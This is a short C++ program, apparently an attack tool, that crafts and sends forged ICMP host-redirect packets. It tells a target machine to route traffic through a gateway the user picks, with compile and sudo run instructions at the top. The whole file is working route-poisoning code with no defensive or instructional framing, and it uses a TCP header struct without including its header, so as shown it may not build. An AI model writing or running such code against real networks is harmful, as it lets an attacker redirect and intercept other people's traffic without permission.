// Compile: g++ -o icmp_redirect icmp_redirect.cpp
// Run: sudo ./icmp_redirect <target_ip> <gateway_ip> <new_gateway_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>

class ICMPRedirect {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    ICMPRedirect() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    void sendRedirect(const char* targetIP, const char* gatewayIP, 
                      const char* newGatewayIP) {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_addr.s_addr = inet_addr(targetIP);
        
        char packet[4096];
        struct icmphdr* icmp = (struct icmphdr*)packet;
        
        memset(packet, 0, 4096);
        
        icmp->type = ICMP_REDIRECT;
        icmp->code = ICMP_REDIRECT_HOST;
        icmp->checksum = 0;
        icmp->un.gateway = inet_addr(newGatewayIP);
        
        // Original IP header (that caused redirect)
        struct iphdr* origIP = (struct iphdr*)(packet + sizeof(struct icmphdr));
        origIP->ihl = 5;
        origIP->version = 4;
        origIP->tot_len = sizeof(struct iphdr) + 8;
        origIP->ttl = 64;
        origIP->protocol = IPPROTO_TCP;
        origIP->saddr = inet_addr(gatewayIP);
        origIP->daddr = inet_addr(targetIP);
        
        // Original TCP header (8 bytes)
        struct tcphdr* origTCP = (struct tcphdr*)(packet + sizeof(struct icmphdr) + sizeof(struct iphdr));
        origTCP->source = htons(80);
        origTCP->dest = htons(rand() % 65535);
        origTCP->seq = rand();
        origTCP->doff = 5;
        origTCP->syn = 1;
        
        int packetLen = sizeof(struct icmphdr) + sizeof(struct iphdr) + 8;
        icmp->checksum = checksum(packet, packetLen);
        
        sendto(sock, packet, packetLen, 0, 
               (struct sockaddr*)&target, sizeof(target));
    }
    
    ~ICMPRedirect() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <gateway_ip> <new_gateway_ip>\n";
        return 1;
    }
    ICMPRedirect redirect;
    redirect.sendRedirect(argv[1], argv[2], argv[3]);
    return 0;
}